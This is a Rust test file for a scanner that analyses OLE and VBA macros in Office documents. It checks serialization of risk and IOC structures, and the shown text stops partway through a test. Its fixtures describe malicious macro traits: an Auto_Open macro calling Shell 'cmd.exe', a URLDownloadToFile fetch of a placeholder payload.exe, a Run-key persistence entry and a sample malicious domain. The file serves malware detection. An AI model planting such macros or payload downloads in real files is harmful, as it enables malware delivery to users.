#![allow(
    clippy::case_sensitive_file_extension_comparisons,
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_precision_loss,
    clippy::cast_sign_loss,
    clippy::collection_is_never_read,
    clippy::field_reassign_with_default,
    clippy::format_push_string,
    clippy::float_cmp,
    clippy::if_not_else,
    clippy::ignore_without_reason,
    clippy::items_after_statements,
    clippy::iter_on_single_items,
    clippy::large_futures,
    clippy::large_stack_arrays,
    clippy::large_stack_frames,
    clippy::manual_assert_eq,
    clippy::manual_let_else,
    clippy::match_same_arms,
    clippy::match_wildcard_for_single_variants,
    clippy::needless_collect,
    clippy::needless_pass_by_ref_mut,
    clippy::needless_pass_by_value,
    clippy::no_effect_underscore_binding,
    clippy::option_if_let_else,
    clippy::ref_option,
    clippy::redundant_clone,
    clippy::redundant_pattern_matching,
    clippy::self_only_used_in_recursion,
    clippy::significant_drop_tightening,
    clippy::single_match_else,
    clippy::single_option_map,
    clippy::too_many_lines,
    clippy::trivially_copy_pass_by_ref,
    clippy::unnecessary_debug_formatting,
    clippy::unreadable_literal,
    clippy::unused_async,
    clippy::unused_self,
    clippy::used_underscore_binding,
    clippy::useless_let_if_seq,
    clippy::wildcard_enum_match_arm,
    clippy::ignored_unit_patterns
)]

use file_scanner::ole_vba_analysis::*;
use std::io::Write;
use std::path::Path;
use tempfile::NamedTempFile;

#[test]
fn test_ole_file_type_variants() {
    // Test all OleFileType variants for serialization
    let file_types = vec![
        OleFileType::Ole2Document,
        OleFileType::OfficeDocument,
        OleFileType::OfficeOpenXml,
        OleFileType::OutlookMessage,
        OleFileType::VisioDocument,
        OleFileType::OneNoteDocument,
        OleFileType::Other("CustomFormat".to_string()),
        OleFileType::NotOleFile,
    ];

    for file_type in file_types {
        let json = serde_json::to_string(&file_type).unwrap();
        let deserialized: OleFileType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{file_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_entry_type_variants() {
    let entry_types = vec![EntryType::Storage, EntryType::Stream, EntryType::Root];

    for entry_type in entry_types {
        let json = serde_json::to_string(&entry_type).unwrap();
        let deserialized: EntryType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{entry_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_node_color_variants() {
    let colors = vec![NodeColor::Red, NodeColor::Black];

    for color in colors {
        let json = serde_json::to_string(&color).unwrap();
        let deserialized: NodeColor = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{color:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_vba_module_type_variants() {
    let module_types = vec![
        VbaModuleType::Standard,
        VbaModuleType::ClassModule,
        VbaModuleType::UserForm,
        VbaModuleType::Document,
        VbaModuleType::Unknown,
    ];

    for module_type in module_types {
        let json = serde_json::to_string(&module_type).unwrap();
        let deserialized: VbaModuleType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{module_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_vba_procedure_type_variants() {
    let procedure_types = vec![
        VbaProcedureType::Sub,
        VbaProcedureType::Function,
        VbaProcedureType::Property,
        VbaProcedureType::Event,
    ];

    for proc_type in procedure_types {
        let json = serde_json::to_string(&proc_type).unwrap();
        let deserialized: VbaProcedureType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{proc_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_vba_reference_type_variants() {
    let reference_types = vec![
        VbaReferenceType::TypeLib,
        VbaReferenceType::Project,
        VbaReferenceType::Control,
        VbaReferenceType::Unknown,
    ];

    for ref_type in reference_types {
        let json = serde_json::to_string(&ref_type).unwrap();
        let deserialized: VbaReferenceType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{ref_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_stream_type_variants() {
    let stream_types = vec![
        StreamType::VbaProject,
        StreamType::VbaModule,
        StreamType::VbaCompiled,
        StreamType::WordDocument,
        StreamType::ExcelWorkbook,
        StreamType::PowerPointDocument,
        StreamType::OleObject,
        StreamType::Metadata,
        StreamType::CustomData,
        StreamType::Unknown,
    ];

    for stream_type in stream_types {
        let json = serde_json::to_string(&stream_type).unwrap();
        let deserialized: StreamType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{stream_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_obfuscation_type_variants() {
    let obfuscation_types = vec![
        ObfuscationType::StringConcatenation,
        ObfuscationType::CharCodeObfuscation,
        ObfuscationType::Base64Encoding,
        ObfuscationType::HexEncoding,
        ObfuscationType::VariableNameObfuscation,
        ObfuscationType::ControlFlowObfuscation,
        ObfuscationType::CommentObfuscation,
        ObfuscationType::Unknown,
    ];

    for obf_type in obfuscation_types {
        let json = serde_json::to_string(&obf_type).unwrap();
        let deserialized: ObfuscationType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{obf_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_connection_type_variants() {
    let connection_types = vec![
        ConnectionType::HttpRequest,
        ConnectionType::FtpConnection,
        ConnectionType::EmailSending,
        ConnectionType::DnsLookup,
        ConnectionType::SocketConnection,
        ConnectionType::Unknown,
    ];

    for conn_type in connection_types {
        let json = serde_json::to_string(&conn_type).unwrap();
        let deserialized: ConnectionType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{conn_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_risk_level_variants() {
    let risk_levels = vec![
        RiskLevel::Low,
        RiskLevel::Medium,
        RiskLevel::High,
        RiskLevel::Critical,
    ];

    for risk_level in risk_levels {
        let json = serde_json::to_string(&risk_level).unwrap();
        let deserialized: RiskLevel = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{risk_level:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_comprehensive_ole_vba_analysis() {
    // Create a comprehensive OleVbaAnalysis structure for testing
    let analysis = OleVbaAnalysis {
        file_type: OleFileType::OfficeDocument,
        ole_structure: Some(OleStructure {
            sector_size: 512,
            mini_sector_size: 64,
            total_sectors: 100,
            fat_sectors: 10,
            directory_sectors: 5,
            mini_fat_sectors: 2,
            root_entry: DirectoryEntry {
                name: "Root Entry".to_string(),
                entry_type: EntryType::Root,
                color: NodeColor::Black,
                size: 0,
                start_sector: 0,
                children: vec!["VBA".to_string(), "WordDocument".to_string()],
            },
            entries: vec![
                DirectoryEntry {
                    name: "VBA".to_string(),
                    entry_type: EntryType::Storage,
                    color: NodeColor::Red,
                    size: 1024,
                    start_sector: 10,
                    children: vec!["Module1".to_string()],
                },
                DirectoryEntry {
                    name: "Module1".to_string(),
                    entry_type: EntryType::Stream,
                    color: NodeColor::Black,
                    size: 512,
                    start_sector: 15,
                    children: vec![],
                },
            ],
        }),
        vba_project: Some(VbaProject {
            project_name: "TestProject".to_string(),
            modules: vec![VbaModule {
                name: "Module1".to_string(),
                module_type: VbaModuleType::Standard,
                source_code: Some("Sub Auto_Open()\n    Shell \"cmd.exe\"\nEnd Sub".to_string()),
                compiled_code: None,
                line_count: 3,
                procedure_count: 1,
                procedures: vec![VbaProcedure {
                    name: "Auto_Open".to_string(),
                    procedure_type: VbaProcedureType::Sub,
                    start_line: 0,
                    end_line: 2,
                    parameters: vec![],
                    local_variables: vec![],
                    external_calls: vec!["Shell".to_string()],
                    risk_score: 85,
                }],
                suspicious_patterns: vec!["Suspicious keyword: shell".to_string()],
            }],
            references: vec![VbaReference {
                name: "stdole".to_string(),
                guid: Some("{00020430-0000-0000-C000-000000000046}".to_string()),
                version: Some("2.0".to_string()),
                path: Some("C:\\Windows\\System32\\stdole2.tlb".to_string()),
                reference_type: VbaReferenceType::TypeLib,
            }],
            properties: std::collections::HashMap::new(),
            protection: VbaProtection {
                is_locked: false,
                is_password_protected: false,
                lock_bytes: None,
                password_hash: None,
            },
            version_info: VbaVersionInfo {
                major: 5,
                minor: 0,
                language_id: 1033,
                performance_cache: false,
            },
        }),
        macros: vec![VbaModule {
            name: "Module1".to_string(),
            module_type: VbaModuleType::Standard,
            source_code: Some("Sub Auto_Open()\n    Shell \"cmd.exe\"\nEnd Sub".to_string()),
            compiled_code: None,
            line_count: 3,
            procedure_count: 1,
            procedures: vec![VbaProcedure {
                name: "Auto_Open".to_string(),
                procedure_type: VbaProcedureType::Sub,
                start_line: 0,
                end_line: 2,
                parameters: vec![],
                local_variables: vec![],
                external_calls: vec!["Shell".to_string()],
                risk_score: 85,
            }],
            suspicious_patterns: vec!["Suspicious keyword: shell".to_string()],
        }],
        streams: vec![
            StreamInfo {
                name: "WordDocument".to_string(),
                size: 4096,
                stream_type: StreamType::WordDocument,
                content_preview: Some("Document content preview...".to_string()),
                entropy: 4.5,
                compression_ratio: Some(0.3),
            },
            StreamInfo {
                name: "VBA/Module1".to_string(),
                size: 512,
                stream_type: StreamType::VbaModule,
                content_preview: Some("Sub Auto_Open()...".to_string()),
                entropy: 6.2,
                compression_ratio: None,
            },
        ],
        suspicious_indicators: SuspiciousIndicators {
            has_macros: true,
            auto_exec_macros: vec!["Module1:Auto_Open".to_string()],
            suspicious_api_calls: vec![SuspiciousApiCall {
                api_name: "shell".to_string(),
                module_name: "Module1".to_string(),
                call_count: 1,
                context: "Found in module Module1".to_string(),
                risk_level: RiskLevel::Critical,
                description: "Command execution".to_string(),
            }],
            obfuscated_code: vec![],
            external_connections: vec![],
            file_operations: vec![],
            registry_operations: vec![],
            process_operations: vec![ProcessOperation {
                operation_type: ProcessOperationType::Create,
                target_process: "Process execution detected".to_string(),
                parameters: vec!["Various parameters".to_string()],
                location: "Module1".to_string(),
                risk_level: RiskLevel::Critical,
            }],
            cryptographic_operations: vec![],
            risk_score: 75,
        },
        metadata: OleMetadata {
            title: Some("Test Document".to_string()),
            subject: Some("VBA Test".to_string()),
            author: Some("Test Author".to_string()),
            keywords: Some("macro, vba, test".to_string()),
            comments: Some("Test document with VBA macros".to_string()),
            last_author: Some("Test User".to_string()),
            revision_number: Some("1".to_string()),
            application_name: Some("Microsoft Word".to_string()),
            creation_time: Some("2024-01-01T00:00:00Z".to_string()),
            last_saved_time: Some("2024-01-02T00:00:00Z".to_string()),
            total_edit_time: Some("PT1H".to_string()),
            security: Some(0),
            custom_properties: std::collections::HashMap::new(),
        },
        security_assessment: SecurityAssessment {
            overall_risk: RiskLevel::Critical,
            risk_factors: vec![
                RiskFactor {
                    factor_type: RiskFactorType::MacroPresence,
                    description: "Document contains VBA macros".to_string(),
                    severity: RiskLevel::Medium,
                    confidence: 1.0,
                },
                RiskFactor {
                    factor_type: RiskFactorType::AutoExecution,
                    description: "Auto-executing macros found: Module1:Auto_Open".to_string(),
                    severity: RiskLevel::High,
                    confidence: 0.9,
                },
                RiskFactor {
                    factor_type: RiskFactorType::SuspiciousApiCalls,
                    description: "Found 1 high-risk API calls".to_string(),
                    severity: RiskLevel::High,
                    confidence: 0.8,
                },
            ],
            recommendations: vec![
                "Disable macros unless absolutely necessary".to_string(),
                "Auto-executing macros detected. Exercise extreme caution".to_string(),
            ],
            ioc_indicators: vec![],
            yara_matches: vec![],
        },
    };

    // Test JSON serialization
    let json = serde_json::to_string(&analysis).unwrap();
    let deserialized: OleVbaAnalysis = serde_json::from_str(&json).unwrap();

    assert_eq!(
        format!("{:?}", analysis.file_type),
        format!("{:?}", deserialized.file_type)
    );
    assert_eq!(analysis.macros.len(), deserialized.macros.len());
    assert_eq!(analysis.streams.len(), deserialized.streams.len());
    assert_eq!(
        analysis.suspicious_indicators.has_macros,
        deserialized.suspicious_indicators.has_macros
    );
    assert_eq!(
        analysis.suspicious_indicators.auto_exec_macros,
        deserialized.suspicious_indicators.auto_exec_macros
    );
    assert_eq!(
        analysis.suspicious_indicators.risk_score,
        deserialized.suspicious_indicators.risk_score
    );
    assert_eq!(
        format!("{:?}", analysis.security_assessment.overall_risk),
        format!("{:?}", deserialized.security_assessment.overall_risk)
    );
}

#[test]
fn test_vba_module_comprehensive() {
    let module = VbaModule {
        name: "TestModule".to_string(),
        module_type: VbaModuleType::ClassModule,
        source_code: Some("Private Sub Class_Initialize()\n    Debug.Print \"Initialized\"\nEnd Sub\n\nPublic Function GetValue() As String\n    GetValue = \"Test\"\nEnd Function".to_string()),
        compiled_code: Some(vec![0x01, 0x02, 0x03, 0x04]),
        line_count: 6,
        procedure_count: 2,
        procedures: vec![
            VbaProcedure {
                name: "Class_Initialize".to_string(),
                procedure_type: VbaProcedureType::Sub,
                start_line: 0,
                end_line: 2,
                parameters: vec![],
                local_variables: vec![],
                external_calls: vec!["Debug.Print".to_string()],
                risk_score: 10,
            },
            VbaProcedure {
                name: "GetValue".to_string(),
                procedure_type: VbaProcedureType::Function,
                start_line: 4,
                end_line: 6,
                parameters: vec![],
                local_variables: vec!["GetValue".to_string()],
                external_calls: vec![],
                risk_score: 5,
            },
        ],
        suspicious_patterns: vec![],
    };

    let json = serde_json::to_string(&module).unwrap();
    let deserialized: VbaModule = serde_json::from_str(&json).unwrap();

    assert_eq!(module.name, deserialized.name);
    assert_eq!(
        format!("{:?}", module.module_type),
        format!("{:?}", deserialized.module_type)
    );
    assert_eq!(module.source_code, deserialized.source_code);
    assert_eq!(module.compiled_code, deserialized.compiled_code);
    assert_eq!(module.line_count, deserialized.line_count);
    assert_eq!(module.procedure_count, deserialized.procedure_count);
    assert_eq!(module.procedures.len(), deserialized.procedures.len());
    assert_eq!(module.suspicious_patterns, deserialized.suspicious_patterns);
}

#[test]
fn test_suspicious_indicators_comprehensive() {
    let indicators = SuspiciousIndicators {
        has_macros: true,
        auto_exec_macros: vec![
            "Module1:Auto_Open".to_string(),
            "Module2:Document_Open".to_string(),
        ],
        suspicious_api_calls: vec![
            SuspiciousApiCall {
                api_name: "CreateObject".to_string(),
                module_name: "Module1".to_string(),
                call_count: 2,
                context: "Object creation in macro".to_string(),
                risk_level: RiskLevel::High,
                description: "Dynamic object creation".to_string(),
            },
            SuspiciousApiCall {
                api_name: "URLDownloadToFile".to_string(),
                module_name: "Module2".to_string(),
                call_count: 1,
                context: "Network download".to_string(),
                risk_level: RiskLevel::Critical,
                description: "Downloads files from internet".to_string(),
            },
        ],
        obfuscated_code: vec![
            ObfuscationIndicator {
                technique: ObfuscationType::StringConcatenation,
                description: "Excessive string concatenation".to_string(),
                location: "Module1".to_string(),
                confidence: 0.8,
            },
            ObfuscationIndicator {
                technique: ObfuscationType::CharCodeObfuscation,
                description: "Character code obfuscation".to_string(),
                location: "Module2".to_string(),
                confidence: 0.9,
            },
        ],
        external_connections: vec![ExternalConnection {
            connection_type: ConnectionType::HttpRequest,
            target: "https://example.com/payload.exe".to_string(),
            method: "GET".to_string(),
            location: "Module1".to_string(),
        }],
        file_operations: vec![FileOperation {
            operation_type: FileOperationType::Write,
            target_path: "C:\\temp\\output.txt".to_string(),
            location: "Module2".to_string(),
            risk_level: RiskLevel::Medium,
        }],
        registry_operations: vec![RegistryOperation {
            operation_type: RegistryOperationType::Write,
            key_path: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                .to_string(),
            value_name: Some("MyApp".to_string()),
            location: "Module1".to_string(),
            risk_level: RiskLevel::High,
        }],
        process_operations: vec![ProcessOperation {
            operation_type: ProcessOperationType::Create,
            target_process: "cmd.exe".to_string(),
            parameters: ["/c", "dir"]
                .iter()
                .map(std::string::ToString::to_string)
                .collect(),
            location: "Module2".to_string(),
            risk_level: RiskLevel::Critical,
        }],
        cryptographic_operations: vec![CryptoOperation {
            operation_type: CryptoOperationType::Encryption,
            algorithm: "AES".to_string(),
            location: "Module1".to_string(),
            risk_level: RiskLevel::Medium,
        }],
        risk_score: 85,
    };

    let json = serde_json::to_string(&indicators).unwrap();
    let deserialized: SuspiciousIndicators = serde_json::from_str(&json).unwrap();

    assert_eq!(indicators.has_macros, deserialized.has_macros);
    assert_eq!(indicators.auto_exec_macros, deserialized.auto_exec_macros);
    assert_eq!(
        indicators.suspicious_api_calls.len(),
        deserialized.suspicious_api_calls.len()
    );
    assert_eq!(
        indicators.obfuscated_code.len(),
        deserialized.obfuscated_code.len()
    );
    assert_eq!(
        indicators.external_connections.len(),
        deserialized.external_connections.len()
    );
    assert_eq!(
        indicators.file_operations.len(),
        deserialized.file_operations.len()
    );
    assert_eq!(
        indicators.registry_operations.len(),
        deserialized.registry_operations.len()
    );
    assert_eq!(
        indicators.process_operations.len(),
        deserialized.process_operations.len()
    );
    assert_eq!(
        indicators.cryptographic_operations.len(),
        deserialized.cryptographic_operations.len()
    );
    assert_eq!(indicators.risk_score, deserialized.risk_score);
}

#[test]
fn test_security_assessment_comprehensive() {
    let assessment = SecurityAssessment {
        overall_risk: RiskLevel::Critical,
        risk_factors: vec![
            RiskFactor {
                factor_type: RiskFactorType::MacroPresence,
                description: "VBA macros detected".to_string(),
                severity: RiskLevel::Medium,
                confidence: 1.0,
            },
            RiskFactor {
                factor_type: RiskFactorType::AutoExecution,
                description: "Auto-executing macros found".to_string(),
                severity: RiskLevel::High,
                confidence: 0.95,
            },
            RiskFactor {
                factor_type: RiskFactorType::NetworkConnections,
                description: "External network connections detected".to_string(),
                severity: RiskLevel::Critical,
                confidence: 0.9,
            },
        ],
        recommendations: vec![
            "Quarantine this document immediately".to_string(),
            "Do not enable macros".to_string(),
            "Scan with updated antivirus".to_string(),
            "Report to security team".to_string(),
        ],
        ioc_indicators: vec![
            IocIndicator {
                indicator_type: IocType::Domain,
                value: "malicious.example.com".to_string(),
                confidence: 0.8,
                context: "Found in VBA code".to_string(),
            },
            IocIndicator {
                indicator_type: IocType::FileName,
                value: "payload.exe".to_string(),
                confidence: 0.9,
                context: "Downloaded file reference".to_string(),
            },
        ],
        yara_matches: vec![
            "VBA_AutoExec_Macro".to_string(),
            "Suspicious_Shell_Commands".to_string(),
        ],
    };

    let json = serde_json::to_string(&assessment).unwrap();
    let deserialized: SecurityAssessment = serde_json::from_str(&json).unwrap();

    assert_eq!(
        format!("{:?}", assessment.overall_risk),
        format!("{:?}", deserialized.overall_risk)
    );
    assert_eq!(
        assessment.risk_factors.len(),
        deserialized.risk_factors.len()
    );
    assert_eq!(assessment.recommendations, deserialized.recommendations);
    assert_eq!(
        assessment.ioc_indicators.len(),
        deserialized.ioc_indicators.len()
    );
    assert_eq!(assessment.yara_matches, deserialized.yara_matches);
}

#[test]
fn test_analyze_ole_vba_non_ole_file() {
    // Test with a non-OLE file
    let mut temp_file = NamedTempFile::new().unwrap();
    temp_file.write_all(b"This is not an OLE file").unwrap();
    temp_file.flush().unwrap();

    let result = analyze_ole_vba(temp_file.path());

    // This may fail due to insufficient header size, which is expected
    if let Ok(analysis) = result {
        assert!(matches!(analysis.file_type, OleFileType::NotOleFile));
        assert!(analysis.ole_structure.is_none());
        assert!(analysis.vba_project.is_none());
        assert!(analysis.macros.is_empty());
        assert!(analysis.streams.is_empty());
        assert!(!analysis.suspicious_indicators.has_macros);
        assert_eq!(analysis.suspicious_indicators.risk_score, 0);
    } else {
        // Expected for non-OLE files with insufficient header size
    }
}

#[test]
fn test_analyze_ole_vba_text_file() {
    // Test with a plain text file
    let mut temp_file = NamedTempFile::new().unwrap();
    temp_file
        .write_all(b"Plain text file content\nwith multiple lines\nfor testing")
        .unwrap();
    temp_file.flush().unwrap();

    let result = analyze_ole_vba(temp_file.path());

    // This may fail due to insufficient header size, which is expected
    if let Ok(analysis) = result {
        assert!(matches!(analysis.file_type, OleFileType::NotOleFile));
        assert!(analysis.ole_structure.is_none());
        assert!(analysis.vba_project.is_none());
        assert!(analysis.macros.is_empty());
        assert!(!analysis.suspicious_indicators.has_macros);
    } else {
        // Expected for non-OLE files with insufficient header size
    }
}

#[test]
fn test_analyze_ole_vba_empty_file() {
    // Test with an empty file
    let mut temp_file = NamedTempFile::new().unwrap();
    temp_file.flush().unwrap();

    let result = analyze_ole_vba(temp_file.path());

    // This will fail due to insufficient header size, which is expected
    if let Ok(analysis) = result {
        assert!(matches!(analysis.file_type, OleFileType::NotOleFile));
        assert!(analysis.ole_structure.is_none());
        assert!(analysis.vba_project.is_none());
        assert!(analysis.macros.is_empty());
        assert!(!analysis.suspicious_indicators.has_macros);
    } else {
        // Expected for empty files with no header
    }
}

#[test]
fn test_analyze_ole_vba_error_cases() {
    // Test with nonexistent file
    let result = analyze_ole_vba(Path::new("/nonexistent/file/path"));
    assert!(result.is_err());

    // Test with directory
    let result = analyze_ole_vba(Path::new("/tmp"));
    assert!(result.is_err());
}

#[test]
fn test_default_implementations() {
    // Test default implementations
    let suspicious_indicators = SuspiciousIndicators::default();
    assert!(!suspicious_indicators.has_macros);
    assert!(suspicious_indicators.auto_exec_macros.is_empty());
    assert!(suspicious_indicators.suspicious_api_calls.is_empty());
    assert_eq!(suspicious_indicators.risk_score, 0);

    let ole_metadata = OleMetadata::default();
    assert!(ole_metadata.title.is_none());
    assert!(ole_metadata.author.is_none());
    assert!(ole_metadata.custom_properties.is_empty());

    let security_assessment = SecurityAssessment::default();
    assert!(matches!(security_assessment.overall_risk, RiskLevel::Low));
    assert!(security_assessment.risk_factors.is_empty());
    assert!(security_assessment.recommendations.is_empty());
    assert!(security_assessment.ioc_indicators.is_empty());
    assert!(security_assessment.yara_matches.is_empty());
}

#[test]
fn test_yaml_serialization() {
    // Test YAML serialization with a simple structure
    let analysis = OleVbaAnalysis {
        file_type: OleFileType::OfficeDocument,
        ole_structure: None,
        vba_project: None,
        macros: vec![],
        streams: vec![],
        suspicious_indicators: SuspiciousIndicators::default(),
        metadata: OleMetadata::default(),
        security_assessment: SecurityAssessment::default(),
    };

    let yaml = serde_yaml::to_string(&analysis).unwrap();
    assert!(yaml.contains("file_type"));
    assert!(yaml.contains("OfficeDocument"));

    let deserialized: OleVbaAnalysis = serde_yaml::from_str(&yaml).unwrap();
    assert!(matches!(
        deserialized.file_type,
        OleFileType::OfficeDocument
    ));
    assert!(deserialized.ole_structure.is_none());
    assert!(deserialized.vba_project.is_none());
}

#[test]
fn test_edge_cases_and_boundaries() {
    // Test with maximum values
    let procedure = VbaProcedure {
        name: "MaxValueTest".to_string(),
        procedure_type: VbaProcedureType::Function,
        start_line: usize::MAX,
        end_line: usize::MAX,
        parameters: vec!["param1".to_string(); 100], // Large parameter list
        local_variables: vec!["var1".to_string(); 50],
        external_calls: vec!["call1".to_string(); 25],
        risk_score: 100, // Maximum risk score
    };

    let json = serde_json::to_string(&procedure).unwrap();
    let deserialized: VbaProcedure = serde_json::from_str(&json).unwrap();

    assert_eq!(procedure.name, deserialized.name);
    assert_eq!(procedure.start_line, deserialized.start_line);
    assert_eq!(procedure.end_line, deserialized.end_line);
    assert_eq!(procedure.parameters.len(), deserialized.parameters.len());
    assert_eq!(procedure.risk_score, deserialized.risk_score);

    // Test with minimum values
    let minimal_procedure = VbaProcedure {
        name: String::new(), // Empty name
        procedure_type: VbaProcedureType::Sub,
        start_line: 0,
        end_line: 0,
        parameters: vec![], // Empty parameters
        local_variables: vec![],
        external_calls: vec![],
        risk_score: 0, // Minimum risk score
    };

    let json = serde_json::to_string(&minimal_procedure).unwrap();
    let deserialized: VbaProcedure = serde_json::from_str(&json).unwrap();

    assert_eq!(minimal_procedure.name, deserialized.name);
    assert_eq!(
        minimal_procedure.parameters.len(),
        deserialized.parameters.len()
    );
    assert_eq!(minimal_procedure.risk_score, deserialized.risk_score);
}

#[test]
fn test_operation_type_variants() {
    // Test FileOperationType variants
    let file_ops = vec![
        FileOperationType::Read,
        FileOperationType::Write,
        FileOperationType::Delete,
        FileOperationType::Execute,
        FileOperationType::Copy,
        FileOperationType::Move,
        FileOperationType::CreateDirectory,
        FileOperationType::Unknown,
    ];

    for op in file_ops {
        let json = serde_json::to_string(&op).unwrap();
        let deserialized: FileOperationType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{op:?}"), format!("{:?}", deserialized));
    }

    // Test RegistryOperationType variants
    let reg_ops = vec![
        RegistryOperationType::Read,
        RegistryOperationType::Write,
        RegistryOperationType::Delete,
        RegistryOperationType::CreateKey,
        RegistryOperationType::Unknown,
    ];

    for op in reg_ops {
        let json = serde_json::to_string(&op).unwrap();
        let deserialized: RegistryOperationType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{op:?}"), format!("{:?}", deserialized));
    }

    // Test ProcessOperationType variants
    let proc_ops = vec![
        ProcessOperationType::Create,
        ProcessOperationType::Execute,
        ProcessOperationType::Inject,
        ProcessOperationType::Terminate,
        ProcessOperationType::Unknown,
    ];

    for op in proc_ops {
        let json = serde_json::to_string(&op).unwrap();
        let deserialized: ProcessOperationType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{op:?}"), format!("{:?}", deserialized));
    }

    // Test CryptoOperationType variants
    let crypto_ops = vec![
        CryptoOperationType::Encryption,
        CryptoOperationType::Decryption,
        CryptoOperationType::Hashing,
        CryptoOperationType::KeyGeneration,
        CryptoOperationType::Unknown,
    ];

    for op in crypto_ops {
        let json = serde_json::to_string(&op).unwrap();
        let deserialized: CryptoOperationType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{op:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_risk_factor_type_variants() {
    let risk_factor_types = vec![
        RiskFactorType::MacroPresence,
        RiskFactorType::AutoExecution,
        RiskFactorType::SuspiciousApiCalls,
        RiskFactorType::NetworkConnections,
        RiskFactorType::FileSystemAccess,
        RiskFactorType::RegistryAccess,
        RiskFactorType::ProcessManipulation,
        RiskFactorType::Obfuscation,
        RiskFactorType::Encryption,
        RiskFactorType::EmbeddedObjects,
        RiskFactorType::Unknown,
    ];

    for factor_type in risk_factor_types {
        let json = serde_json::to_string(&factor_type).unwrap();
        let deserialized: RiskFactorType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{factor_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_ioc_type_variants() {
    let ioc_types = vec![
        IocType::Domain,
        IocType::IpAddress,
        IocType::Url,
        IocType::EmailAddress,
        IocType::FileName,
        IocType::FilePath,
        IocType::RegistryKey,
        IocType::Mutex,
        IocType::ProcessName,
        IocType::Unknown,
    ];

    for ioc_type in ioc_types {
        let json = serde_json::to_string(&ioc_type).unwrap();
        let deserialized: IocType = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{ioc_type:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_complex_vba_project() {
    let project = VbaProject {
        project_name: "ComplexProject".to_string(),
        modules: vec![
            VbaModule {
                name: "StandardModule".to_string(),
                module_type: VbaModuleType::Standard,
                source_code: Some("Sub TestSub()\nEnd Sub".to_string()),
                compiled_code: None,
                line_count: 2,
                procedure_count: 1,
                procedures: vec![],
                suspicious_patterns: vec![],
            },
            VbaModule {
                name: "ClassModule1".to_string(),
                module_type: VbaModuleType::ClassModule,
                source_code: None,
                compiled_code: Some(vec![0xDE, 0xAD, 0xBE, 0xEF]),
                line_count: 0,
                procedure_count: 0,
                procedures: vec![],
                suspicious_patterns: vec![],
            },
        ],
        references: vec![
            VbaReference {
                name: "stdole".to_string(),
                guid: Some("{00020430-0000-0000-C000-000000000046}".to_string()),
                version: Some("2.0".to_string()),
                path: Some("C:\\Windows\\System32\\stdole2.tlb".to_string()),
                reference_type: VbaReferenceType::TypeLib,
            },
            VbaReference {
                name: "MSForms".to_string(),
                guid: Some("{0D452EE1-E08F-101A-852E-02608C4D0BB4}".to_string()),
                version: Some("2.0".to_string()),
                path: None,
                reference_type: VbaReferenceType::Control,
            },
        ],
        properties: {
            let mut props = std::collections::HashMap::new();
            props.insert("Name".to_string(), "ComplexProject".to_string());
            props.insert("HelpContextID".to_string(), "0".to_string());
            props.insert("VersionCompatible32".to_string(), "393222000".to_string());
            props
        },
        protection: VbaProtection {
            is_locked: true,
            is_password_protected: true,
            lock_bytes: Some(vec![0x12, 0x34, 0x56, 0x78]),
            password_hash: Some("abc123def456".to_string()),
        },
        version_info: VbaVersionInfo {
            major: 6,
            minor: 1,
            language_id: 1033,
            performance_cache: true,
        },
    };

    let json = serde_json::to_string(&project).unwrap();
    let deserialized: VbaProject = serde_json::from_str(&json).unwrap();

    assert_eq!(project.project_name, deserialized.project_name);
    assert_eq!(project.modules.len(), deserialized.modules.len());
    assert_eq!(project.references.len(), deserialized.references.len());
    assert_eq!(project.properties.len(), deserialized.properties.len());
    assert_eq!(
        project.protection.is_locked,
        deserialized.protection.is_locked
    );
    assert_eq!(
        project.protection.is_password_protected,
        deserialized.protection.is_password_protected
    );
    assert_eq!(project.version_info.major, deserialized.version_info.major);
    assert_eq!(
        project.version_info.performance_cache,
        deserialized.version_info.performance_cache
    );
}

// New tests for improved coverage

#[test]
fn test_entropy_calculation() {
    use file_scanner::ole_vba_analysis::calculate_entropy;

    // Test with uniform data (zero entropy)
    let uniform_data = vec![0u8; 1000];
    assert_eq!(calculate_entropy(&uniform_data), 0.0);

    // Test with maximum entropy data
    let max_entropy_data: Vec<u8> = (0..=255).cycle().take(1024).collect();
    let entropy = calculate_entropy(&max_entropy_data);
    assert!(entropy > 7.9 && entropy <= 8.0);

    // Test with empty data
    assert_eq!(calculate_entropy(&[]), 0.0);

    // Test with binary data
    let binary_data = vec![0, 1, 0, 1, 0, 1, 0, 1];
    let binary_entropy = calculate_entropy(&binary_data);
    assert!(binary_entropy > 0.9 && binary_entropy < 1.1);
}

#[test]
fn test_file_type_detection_edge_cases() {
    use file_scanner::ole_vba_analysis::detect_ole_file_type;

    // Test with OLE2 signature
    let mut ole_header = vec![0u8; 512];
    ole_header[0..8].copy_from_slice(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1");

    let mut temp_file = NamedTempFile::new().unwrap();
    temp_file.write_all(&ole_header).unwrap();
    temp_file.flush().unwrap();

